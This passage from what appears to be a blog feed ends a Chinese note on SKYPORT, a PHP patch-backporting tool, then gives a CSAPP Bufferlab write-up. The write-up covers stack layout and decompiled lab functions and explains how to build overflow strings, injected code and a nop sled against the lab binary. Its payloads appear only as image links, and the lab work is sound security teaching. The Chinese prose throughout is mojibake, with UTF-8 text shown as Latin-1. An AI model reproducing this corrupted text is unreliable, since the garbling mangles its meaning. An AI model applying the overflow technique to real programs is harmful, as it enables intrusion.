‡ç­¾ï¼ˆLabelsï¼‰ï¼šç”¨äºæ ‡è¯†ä»£ç çš„ä¸åŒéƒ¨åˆ†ï¼Œä»¥ä¾¿åœ¨è·³è½¬æŒ‡ä»¤ä¸­å¼•ç”¨ã€‚<br></code></pre></td></tr></table></figure><h4 id="SBPéªŒè¯å’Œç”Ÿæˆ"><a href="#SBPéªŒè¯å’Œç”Ÿæˆ" class="headerlink" title="SBPéªŒè¯å’Œç”Ÿæˆ"></a>SBPéªŒè¯å’Œç”Ÿæˆ</h4><p>åœ¨è¿™ä¸€æ­¥ï¼Œéœ€è¦æ£€æŸ¥åŸå§‹çš„å®˜æ–¹è¡¥ä¸æ˜¯å¦å¯ä»¥è¿›è¡Œé€†å‘ç§»æ¤ï¼Œå¹¶å°†å…¶è½¬åŒ–æˆSBPï¼Œå…·ä½“æ¥è¯´ï¼Œéœ€è¦æ£€æŸ¥ä»¥ä¸‹ä¸‰ä¸ªå±æ€§ï¼š</p><p>PSBP-aï¼šå¯¹äºæ¯ä¸ªflow kï¼ŒRC post flow k éƒ½æ˜¯RC pre flow kçš„å­é›†ï¼ˆä¸ºäº†é˜²æ­¢SBPå¼•å…¥æœªçŸ¥çš„æ§åˆ¶æµåˆ°è¡¥ä¸åçš„ç‰ˆæœ¬ï¼‰</p><p>PSBP-bï¼šå¯¹äºæ¯ä¸ªflow kï¼ŒDE post flow kéƒ½æ˜¯ DE pre flow kçš„å­é›†ï¼ˆä¸ºäº†é˜²æ­¢SBPè¡¥ä¸å‘è¡¥ä¸åç‰ˆæœ¬å¼•å…¥æœªçŸ¥çš„æ•°æ®è¡¨è¾¾å¼ï¼Œå› ä¸ºè¿™æœ‰å¯èƒ½ç ´åç›®æ ‡ç‰ˆæœ¬çš„åŠŸèƒ½ï¼‰</p><p>PSBP-cï¼šå¯¹äºæ¯ä¸ªflow kï¼ŒRC post flow kå’ŒDE post flow kéƒ½æ˜¯ç¡®å®šå¯è®¡ç®—çš„ï¼ˆæ’é™¤äº†ä¾‹å¦‚timeï¼ˆï¼‰ï¼Œrandï¼ˆï¼‰ç­‰è¿”å›éç¡®å®šæ€§å€¼çš„å‡½æ•°ï¼‰</p><p>è¿™ä¸‰ä¸ªå±æ€§ç¡®ä¿SBPçš„éƒ¨ç½²ä¸ä¼šå½±å“ç›®æ ‡åº”ç”¨ç¨‹åºçš„æ­£å¸¸åŠŸèƒ½</p><p>è‹¥åŒæ—¶æ»¡è¶³è¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œé‚£å°±è®¤ä¸ºåŸå§‹è¡¥ä¸æ˜¯å¯ä»¥è¿›è¡Œåå‘ç§»æ¤çš„</p><p>ç„¶åSKYPORTå°±ä¼šç”Ÿæˆä¸€ä¸ªå®‰å…¨çš„sinkå‡½æ•°ï¼Œå¹¶æ›¿æ¢æ‰åŸå§‹çš„sinkå‡½æ•°</p><p>å› ä¸ºåœ¨æ±‡èšç‚¹èƒ½åŠ›æå–çš„æ—¶å€™ï¼Œå¯¹äºå¾ªç¯ï¼Œæ˜¯åªå±•å¼€ä¸€æ¬¡ï¼Œç„¶åè®¡ç®—çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨è€ƒè™‘SBPéªŒè¯æ—¶å¯¹å¾ªç¯è¿›è¡Œå¤„ç†å¤„ç†ï¼š</p><ul><li>è¡¥ä¸å’Œæ±‡èšç‚¹åœ¨å¾ªç¯ä½“å†…ï¼šSKYPORTå°†å¾ªç¯å—è§†ä½œä¸€ä¸ªå‡½æ•°ï¼Œå¹¶è®¡ç®—å‡½æ•°å†…çš„SCï¼Œç„¶åè¿›è¡ŒSBPéªŒè¯</li><li>è¡¥ä¸åœ¨å¤–ï¼Œæ±‡èšç‚¹åœ¨å†…ï¼šSKYPORTå°†å¾ªç¯è§†ä½œsinkå‡½æ•°ï¼Œè®¡ç®—SC</li><li>è¡¥ä¸åœ¨å†…æˆ–è€…å¤–ï¼Œæ±‡èšç‚¹åœ¨å¤–ï¼šSKYPORTå°†å¾ªç¯å°è£…æˆä¸€ä¸ªå‡½æ•°ç”¨ä»¥è®¡ç®—SCï¼ˆï¼Ÿï¼‰</li></ul><h4 id="SBVéªŒè¯"><a href="#SBVéªŒè¯" class="headerlink" title="SBVéªŒè¯"></a>SBVéªŒè¯</h4><p>åŒæ ·çš„ï¼ŒåŸºäºæ±‡èšç‚¹èƒ½åŠ›çš„å­å±æ€§æ¥è¿›è¡ŒéªŒè¯</p><p>PSBV-aï¼šå¯¹äºæ¯ä¸ª f lowkï¼ŒRC pre flow k ä¸ RC target flow kç›¸åŒã€‚è¿™ä¸ªå±æ€§ç¡®ä¿ç›®æ ‡ç‰ˆæœ¬ä¸­æ²¡æœ‰é¢å¤–çš„è„†å¼±æ§åˆ¶æµã€‚sink1å’Œsink2 targetï¼šsink1</p><p>PSBV-bï¼šå¯¹äºæ¯ä¸ª f lowkï¼ŒDE pre flow k ä¸ DE target flow k ç›¸åŒã€‚è¿™ä¸ªå±æ€§ç¡®ä¿ç›®æ ‡ç‰ˆæœ¬ä¸­æ²¡æœ‰é¢å¤–çš„è„†å¼±æ•°æ®è¡¨è¾¾å¼ã€‚</p><p>è¿™ä¸¤ä¸ªå­å±æ€§å¯ä»¥ä¿è¯å°†SBPåº”ç”¨åˆ°SBVåèƒ½ä¿è¯å®‰å…¨æ€§ï¼Œå› ä¸ºä¸¤ä¸ªç‰ˆæœ¬çš„è„†å¼±é€»è¾‘å®Œå…¨ç›¸åŒ</p><h4 id="éƒ¨ç½²è¡¥ä¸"><a href="#éƒ¨ç½²è¡¥ä¸" class="headerlink" title="éƒ¨ç½²è¡¥ä¸"></a>éƒ¨ç½²è¡¥ä¸</h4><p>å¯¹Webåº”ç”¨ç¨‹åºçš„æºä»£ç è¿›è¡Œä¿®æ”¹</p><p>åŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼Œæ›¿æ¢å’Œå¤‡ä»½</p><p><strong>æ›¿æ¢</strong></p><ol><li>å‡½æ•°æ›¿æ¢ï¼šç›´æ¥å°†sinkå‡½æ•°æ›¿æ¢æˆå®‰å…¨çš„å‡½æ•°</li><li>å‚æ•°æ›¿æ¢ï¼šè‹¥sinkå‡½æ•°æ— æ³•è¢«ç›´æ¥æ›¿æ¢ï¼Œæ¯”å¦‚æ˜¯phpçš„å…³é”®å­—includeä¹‹ç±»çš„ï¼ŒSKYPORTå°±å°†includeæ”¹æˆinclude safe_include()</li></ol><p>åœ¨è¿™ä¸€æ­¥æ—¶ï¼ŒSKYPORTä¼šæ£€æŸ¥åç§°å†²çªé¿å…å‡½æ•°åç§°å·²ç»è¢«ä½¿ç”¨äº†</p><p><strong>å¤‡ä»½</strong></p><p>SKYPORTå¤‡ä»½äº†ä¸sinkå‡½æ•°ç›¸å…³çš„å˜é‡ï¼Œç‰¹åˆ«æ˜¯å…¨å±€å˜é‡ã€æ±‡èšå‡½æ•°è°ƒç”¨è€…çš„å‚æ•°å’Œå¤–éƒ¨å˜é‡ï¼Œç„¶ååœ¨å®‰å…¨çš„å‡½æ•°ä¸­ä½¿ç”¨</p><h4 id="å®éªŒç»“æœ"><a href="#å®éªŒç»“æœ" class="headerlink" title="å®éªŒç»“æœ"></a>å®éªŒç»“æœ</h4><p><img src="/2023/10/31/ReadPaper3/image-20231108165043937.png" alt="image-20231108165043937"></p><p>æ•°æ®é›†åŒ…æ‹¬äº† 155 ä¸ªè¡¥ä¸ï¼ˆå³ 155 ä¸ªé¢„è¡¥ä¸ç‰ˆæœ¬å’Œåè¡¥ä¸ç‰ˆæœ¬ï¼‰ä»¥åŠ 1,526 ä¸ªæœ‰æ¼æ´çš„ç›®æ ‡æ—§ç‰ˆæœ¬</p><p>ä¸å½“å‰æœ€å…ˆè¿›çš„æŠ€æœ¯è¿›è¡Œæ¯”è¾ƒï¼š</p><p><img src="/2023/10/31/ReadPaper3/image-20231108165248741.png" alt="image-20231108165248741"></p><ol><li>**ç›´æ¥åº”ç”¨è¡¥ä¸(Direct Patch Application)**ï¼šè¿™ç§æ–¹æ³•ç›´æ¥ä½¿ç”¨â€patchâ€å‘½ä»¤å°†å®˜æ–¹è¡¥ä¸åº”ç”¨åˆ°ç›®æ ‡ç‰ˆæœ¬ä¸Šã€‚</li><li>**ä¸¥æ ¼è‡ªåŠ¨å‡çº§(Strict Auto-upgrade)**ï¼šå¦‚æœä¸¤ä¸ª Web åº”ç”¨ç¨‹åºç‰ˆæœ¬ä¹‹é—´æ”¯æŒçš„ PHP ç‰ˆæœ¬ç›¸åŒï¼Œåˆ©ç”¨ Web åº”ç”¨ç¨‹åºæ¡†æ¶æä¾›çš„è‡ªåŠ¨å‡çº§ API</li><li>**æ‡’æƒ°è‡ªåŠ¨å‡çº§(Lazy Auto-upgrade)**ï¼šè¿™ç§æ–¹æ³•æ˜¯å¯¹ä¸¥æ ¼è‡ªåŠ¨å‡çº§çš„ä¸€ç§å®½æ¾æ–¹æ³•ï¼Œå®ƒè®¤ä¸ºå¦‚æœ PHP ç‰ˆæœ¬å†²çªä»…å­˜åœ¨äºæµ‹è¯•æ–‡ä»¶ä¸­ï¼Œè‡ªåŠ¨å‡çº§å°±å¯ä»¥æˆåŠŸã€‚</li></ol>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapplab-bufferlab</title>
    <link href="/2023/10/06/csapplab-bufferlab/"/>
    <url>/2023/10/06/csapplab-bufferlab/</url>
    
    <content type="html"><![CDATA[<h2 id="Bufferlab"><a href="#Bufferlab" class="headerlink" title="Bufferlab"></a>Bufferlab</h2><h2 id="å®éªŒç®€ä»‹"><a href="#å®éªŒç®€ä»‹" class="headerlink" title="å®éªŒç®€ä»‹"></a>å®éªŒç®€ä»‹</h2><h4 id="IA32çš„æ ˆå¸§"><a href="#IA32çš„æ ˆå¸§" class="headerlink" title="IA32çš„æ ˆå¸§"></a>IA32çš„æ ˆå¸§</h4><p>IA32çš„æ ˆå¸§åŒx86çš„æ ˆå¸§ç›¸ä¼¼ï¼Œæ ˆä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ã€‚å¯„å­˜å™¨%espä¿å­˜çš„æ˜¯æ ˆå¸§çš„æ ˆé¡¶ï¼ˆä½åœ°å€ï¼‰ï¼Œå¯„å­˜å™¨%ebpä¿å­˜çš„æ˜¯æ ˆå¸§çš„æ ˆåº•ï¼ˆé«˜åœ°å€ï¼‰ã€‚</p><p>è°ƒç”¨è€…çš„æ ˆå¸§ä¸»è¦åŒ…æ‹¬äº†å‚æ•°åŒºä»¥åŠè¿”å›åœ°å€ã€‚</p><p>è¢«è°ƒç”¨è€…çš„æ ˆå¸§çš„æ ˆåº•é¦–å…ˆæ˜¯ä¿å­˜çš„å¯„å­˜å™¨ebpå€¼ï¼ˆæŒ‡å‘è°ƒç”¨è€…çš„æ ˆåº•ï¼‰ï¼Œç„¶åæ˜¯è¢«ä¿å­˜çš„å¯„å­˜å™¨ï¼Œå±€éƒ¨å˜é‡ä»¥åŠä¸´æ—¶ç©ºé—´ï¼Œæœ€åæ˜¯å‚æ•°æ„é€ åŒºã€‚</p><h2 id="å®éªŒå‡†å¤‡"><a href="#å®éªŒå‡†å¤‡" class="headerlink" title="å®éªŒå‡†å¤‡"></a>å®éªŒå‡†å¤‡</h2><p>å®éªŒè®²ä¹‰ä¸­ä¸»è¦åŒ…å«äº†ä»¥ä¸‹3ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><ul><li>bufbomb ä½ æ‰€è¦æ”»å‡»çš„ç¼“å†²åŒºç‚¸å¼¹ç¨‹åº</li><li>makecookie æ ¹æ®ä½ æ‰€è¾“å…¥çš„useridç”Ÿæˆä¸€ä¸ªcookie</li><li>hex2raw ä¸€ä¸ªç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²çš„å·¥å…·</li></ul><p>é¦–å…ˆç”Ÿæˆä¸€ä¸ªcookieä¾›åç»­ä½¿ç”¨ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012161536180.png" alt="image-20231012161536180"></p><p>ç„¶åä½¿ç”¨Ghidraå°†bufbombåæ±‡ç¼–ä¾›åç»­åˆ†æ</p><h2 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h2><h3 id="é˜¶æ®µ0-Candle"><a href="#é˜¶æ®µ0-Candle" class="headerlink" title="é˜¶æ®µ0:Candle"></a>é˜¶æ®µ0:Candle</h3><p>åœ¨bufbombä¸­ï¼Œé€šè¿‡äº†test()å‡½æ•°è°ƒç”¨getbuf()å‡½æ•°</p><p>testå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">int</span> iVar3;<br>  <br>  iVar1 = uniqueval();<span class="hljs-comment">//è¿™ä¸ªå‡½æ•°åˆ©ç”¨è¿›ç¨‹çš„idä½œä¸ºç§å­ç”Ÿæˆä¸€ä¸ªä¼ªéšæœºæ•°</span><br>  iVar2 = getbuf();<br>  iVar3 = uniqueval();<br>  <span class="hljs-keyword">if</span> (iVar3 == iVar1) &#123;<span class="hljs-comment">//ç”¨äºéªŒè¯æ ˆæ˜¯å¦è¢«æŸå</span><br>    <span class="hljs-keyword">if</span> (iVar2 == cookie) &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>      validate(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>,iVar2);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>getbufï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined4 <span class="hljs-title function_">getbuf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  undefined local_2c [<span class="hljs-number">40</span>];  <br>  Gets(local_2c);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›®æ ‡ï¼šè®©ä»£ç æ‰§è¡Œsmokeï¼ˆï¼‰è€Œä¸æ˜¯è®©getbufï¼ˆï¼‰è¿”å›1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163333070.png" alt="image-20231012163333070"></p><p>é€šè¿‡Ghidraçš„åæ±‡ç¼–ç»“æœå¯ä»¥çœ‹åˆ°smokeå‡½æ•°çš„èµ·å§‹åœ°å€ä¸º08048c18</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012163807613.png" alt="image-20231012163807613"></p><p>å†åˆ†ægetbufçš„æ±‡ç¼–ä»£ç </p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012170015339.png" alt="image-20231012170015339"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¼€è¾Ÿäº†ä¸€ä¸ª0x38ï¼ˆ56ï¼‰å­—èŠ‚çš„æ ˆç©ºé—´ï¼Œå°†æ•°ç»„çš„é¦–åœ°å€æ”¾åœ¨äº†ebp-0x28çš„ä½ç½®ï¼Œå°±æ˜¯è¯´ç¼“å†²åŒºæœ‰40ä¸ªå­—èŠ‚ã€‚</p><p>å†åŠ ä¸Šè¿”å›åœ°å€å’Œä¿å­˜çš„æ—§çš„ebpå€¼ï¼Œæ­¤å¤„éœ€è¦æ„é€ å¦‚ä¸‹æ”»å‡»å­—æ®µï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192005282.png" alt="image-20231012192005282"></p><p>ä½¿ç”¨hex2rawç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²å¹¶æµ‹è¯•</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012192126197.png" alt="image-20231012192126197"></p><h3 id="é˜¶æ®µ1-Sparkler"><a href="#é˜¶æ®µ1-Sparkler" class="headerlink" title="é˜¶æ®µ1: Sparkler"></a>é˜¶æ®µ1: Sparkler</h3><p>ç›®æ ‡ï¼šgetbufè¿”å›æ—¶è·³è½¬åˆ°fizz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fizz</span><span class="hljs-params">(<span class="hljs-type">int</span> param_1)</span><br><br>&#123;<br>  <span class="hljs-keyword">if</span> (param_1 == cookie) &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>,param_1);<br>    validate(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    __printf_chk(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>,param_1);<br>  &#125;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¦æˆåŠŸè°ƒç”¨fizzè¿˜éœ€è¦å°†cookieä½œä¸ºå‚æ•°ä¼ é€’ï¼Œåœ¨IA32ä¸­ï¼Œå‚æ•°æ˜¯é€šè¿‡è°ƒç”¨è€…çš„æ ˆè¿›è¡Œä¼ é€’çš„</p><p>è§‚å¯Ÿfizzçš„åæ±‡ç¼–ä»£ç ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012194646326.png" alt="image-20231012194646326"></p><p><code>mov    0x8(%ebp),%eax</code>å’Œ <code>cmp    0x804d108,%eax</code>è¿™ä¸¤å¥ï¼Œå°†ebp+8çš„ä½ç½®çš„å€¼èµ‹å€¼ç»™eaxï¼Œå†å°†eaxä¸0x804d108çš„å€¼æ¯”è¾ƒï¼Œå¯ä»¥çŒœæµ‹ebp+8ä½ç½®å­˜æ”¾çš„å°±æ˜¯ä¼ é€’çš„å‚æ•°ï¼Œè€Œ0x804d108çš„å€¼ä¸ºcookie</p><p>é€šè¿‡gdbè°ƒè¯•éªŒè¯ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200351900.png" alt="image-20231012200351900"></p><p>å¯ä»¥å¾—åˆ°0x804d108çš„å€¼å°±æ˜¯cookieï¼Œé‚£ä¹ˆå‚æ•°å°±åœ¨ebp+8çš„ä½ç½®ï¼ŒçŒœæµ‹æ­£ç¡®</p><p>æ„é€ å¦‚ä¸‹æ”»å‡»å­—æ®µï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195924030.png" alt="image-20231012195924030"></p><p>è¿›è¡Œç”Ÿæˆå’Œæµ‹è¯•ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012195855241.png" alt="image-20231012195855241"></p><p>ç–‘é—®ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012200444062.png" alt="image-20231012200444062"></p><p>ä¸ºä»€ä¹ˆè¿™é‡Œä¹Ÿæ˜¯è¡¨ç¤ºçš„æ˜¯ebp+8çš„ä½ç½®</p><h3 id="é˜¶æ®µ2ï¼šFirecracker"><a href="#é˜¶æ®µ2ï¼šFirecracker" class="headerlink" title="é˜¶æ®µ2ï¼šFirecracker"></a>é˜¶æ®µ2ï¼šFirecracker</h3><p>ç›®æ ‡ï¼šå«æœ‰ä¸€ä¸ª bang å‡½æ•°ï¼Œå’Œä¸€ä¸ªå…¨å±€å˜é‡ global_valueï¼Œéœ€è¦æ³¨å…¥æœºå™¨ä»£ç ï¼Œä¿®æ”¹ global_value ä¸º cookies çš„å€¼ï¼Œå†è°ƒç”¨ bang å‡½æ•°ã€‚</p><p>Ghidraè·å¾—çš„bangå‡½æ•°ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012202402226.png" alt="image-20231012202402226"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012204852875.png" alt="image-20231012204852875"></p><p>é€šè¿‡gdbæŸ¥çœ‹0x804d100çš„å€¼å’Œ0x804d108ï¼ˆä¸Šä¸€é—®å¾—å‡ºè¯¥åœ°å€ä¸ºcookieï¼‰</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012205107345.png" alt="image-20231012205107345"></p><p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹æ”»å‡»ä»£ç ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211941649.png" alt="image-20231012211941649"></p><p>ç¬¬ä¸€å¥movlç”¨äºä¿®æ”¹global_valueçš„å€¼ï¼Œç¬¬äºŒæ­¥ç”¨äºå°†bangå‹æ ˆ</p><p>è·å–å…¶æœºå™¨ä»£ç ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212046878.png" alt="image-20231012212046878"></p><p>é€šè¿‡gdbè®¾ç½®æ–­ç‚¹</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212231854.png" alt="image-20231012212231854"></p><p>æ­¤æ—¶çš„ebp-0x28çš„ä½ç½®å°±æ˜¯ç¼“å†²åŒºçš„é¦–åœ°å€ï¼Œ</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212311757.png" alt="image-20231012212311757"></p><p>æ„é€ æ”»å‡»ä»£ç ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012212345337.png" alt="image-20231012212345337"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012211925176.png" alt="image-20231012211925176"></p><h3 id="é˜¶æ®µ3-Dynamite"><a href="#é˜¶æ®µ3-Dynamite" class="headerlink" title="é˜¶æ®µ3 Dynamite"></a>é˜¶æ®µ3 Dynamite</h3><p>è®©å‡½æ•°getbufè¿”å›cookieè€Œä¸æ˜¯1è‡³å‡½æ•°testã€‚æ³¨æ„åˆ°åœ¨testä¸­å½“è¿”å›å€¼ä¸ºcookieæ—¶ç¨‹åºä¼šè¾“å‡ºâ€Boom!â€ã€‚ä½ çš„æ”»å‡»ä»£ç åº”å½“å°†cookieè®¾ç½®ä¸ºè¿”å›å€¼ï¼Œæ¢å¤ä»»ä½•è¢«ç ´åçš„çŠ¶æ€ï¼Œå°†æ­£ç¡®çš„è¿”å›åœ°å€pushåˆ°æ ˆä¸Šï¼Œæœ€ç»ˆæ‰§è¡ŒretæŒ‡ä»¤ã€‚</p><p>æœ€åˆæ˜¯testè°ƒç”¨getbufï¼Œå‰å‡ é—®é€šè¿‡ç¼“å†²åŒºæº¢å‡ºçš„æ”»å‡»ï¼Œå®ç°äº†åˆ°åˆ«çš„å‡½æ•°çš„è·³è½¬ï¼Œä½†ä¸ä¼šå›æ¥ç»§ç»­æ‰§è¡Œtestå‡½æ•°å‰©ä¸‹çš„å†…å®¹ã€‚ä»testå‡½æ•°å¯ä»¥çœ‹å‡ºï¼Œå½“æ”¶åˆ°getbufçš„è¿”å›å€¼ä¸º1æ—¶ï¼Œä¼šè¾“å‡ºDudï¼Œå½“è¯¥å€¼ä¸ºcookieæ—¶ï¼Œä¼šè¾“å‡ºBoomï¼</p><p>ä½†çœ‹getbufå‡½æ•°å¯ä»¥çŸ¥é“ï¼Œåœ¨å‡½æ•°ç»“æŸåï¼Œä¼šå°†eaxçš„å€¼è®¾ç½®ä¸º1ç„¶åè¿”å›</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012214342894.png" alt="image-20231012214342894"></p><p>æ‰€ä»¥æ„é€ çš„ä»£ç ç¬¬ä¸€æ­¥è¦ä¿®æ”¹eaxçš„å€¼ä¸ºcookie</p><p>è€Œåœ¨è¿›è¡Œç¼“å†²åŒºè¦†ç›–çš„æ—¶å€™ï¼Œæ—§çš„ebpå€¼ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥éœ€è¦æ¢å¤æ­¤æ—¶çš„ebpå€¼</p><p>ç¬¬ä¸‰æ­¥æ˜¯éœ€è¦è¿›è¡Œè¿”å›åœ°å€çš„ä¿®æ”¹ï¼Œè®©å‡½æ•°èƒ½å¤Ÿç»§ç»­æ‰§è¡Œtestå‡½æ•°</p><p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹æ”»å‡»ä»£ç ï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215742153.png" alt="image-20231012215742153"></p><p>è½¬æ¢æˆæœºå™¨ä»£ç çš„æ­¥éª¤è·Ÿä¸Šä¸€é—®ä¸€æ ·ï¼Œæœ€åæ„é€ çš„æ”»å‡»å­—æ®µä¸ºï¼š</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215823675.png" alt="image-20231012215823675"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012215723486.png" alt="image-20231012215723486"></p><h3 id="é˜¶æ®µ4-Nitroglycerin"><a href="#é˜¶æ®µ4-Nitroglycerin" class="headerlink" title="é˜¶æ®µ4 Nitroglycerin"></a>é˜¶æ®µ4 <strong>Nitroglycerin</strong></h3><p>ç¨‹åºè¿è¡Œæ—¶å¯ç”¨äº† -n é€‰é¡¹æ—¶ï¼Œç¨‹åºåœ¨è¯»å–è¾“å…¥æ—¶ä¼šå¯ç”¨ getbufnå‡½æ•°(è€Œä¸æ˜¯å‰é¢çš„getbuf)ã€‚getbufnå‡½æ•°æœ‰ä¸getbufç›¸ä¼¼çš„åŠŸèƒ½ï¼Œä½†å‰è€…è¾“å…¥æ•°ç»„çš„é•¿åº¦ä¸º512å­—èŠ‚ã€‚è°ƒç”¨getbufnå‡½æ•°ä¹‹å‰ï¼Œç¨‹åºä¼šå…ˆåœ¨æ ˆä¸Šåˆ†é…ä¸€ä¸ªéšæœºé•¿åº¦çš„ç©ºé—´ï¼Œä»è€Œä½¿å¾—getbufnå‡½æ•°çš„æ ˆç©ºé—´åœ¨ä¸åŒè°ƒç”¨æƒ…å†µä¸‹ä¸å†æ˜¯å›ºå®šçš„ï¼Œå®é™…ä¸Š%ebpçš„å·®å€¼è¾¾åˆ°Â±240ã€‚åœ¨åº”ç”¨ -n é€‰é¡¹çš„æƒ…å†µä¸‹ï¼Œç¨‹åºä¼šè¦æ±‚æäº¤è¾“å…¥å­—ç¬¦ä¸² 5 æ¬¡ï¼Œ5æ¬¡è¾“å…¥ä¼šé¢å¯¹5ä¸ªä¸åŒçš„æ ˆç©ºé—´ï¼Œå¹¶è¦æ±‚æ¯æ¬¡éƒ½æˆåŠŸè¿”å›cookieå€¼ã€‚level 4çš„ä»»åŠ¡ä¸level 3ä¸€è‡´ï¼Œå³è¦æ±‚getbufnå‡½æ•°è¿”å›è°ƒç”¨å‡½æ•°testnæ—¶è¿”å›cookieå€¼ï¼Œè€Œä¸æ˜¯å¸¸è§„çš„1</p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221107722.png" alt="image-20231012221107722"></p><p><img src="/2023/10/06/csapplab-bufferlab/image-20231012221140589.png" alt="image-20231012221140589"></p><p>å¯¹äºæ ˆéšæœºåŒ–çš„ç ´è§£å¯ä»¥ä½¿ç”¨ç©ºæ“ä½œé›ªæ©‡ï¼Œnop sledæ˜¯åœ¨æ„é€ çš„æœºå™¨ä»£ç ä¹‹å‰åŠ å…¥nopæŒ‡ä»¤ï¼ˆno operationçš„ç¼©å†™ï¼Œæœºå™¨ç ä½ 0x90ï¼‰ï¼Œå…¶ä½œç”¨ä¸ºä»…å°†PCå¢åŠ è€Œä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªè¦è¦†ç›–çš„åœ°å€èƒ½å¤ŸæŒ‡å‘nopåºåˆ—æ‰€å¤„çš„ä»»æ„ä¸€ä¸ªåœ°å€ï¼Œå°±å¯ä»¥é¡ºåºæ‰§è¡ŒnopæŒ‡ä»¤ï¼Œç›´åˆ°é‡åˆ°çœŸæ­£æ„é€ çš„æœºå™¨ä»£ç ï¼Œè¿™æ 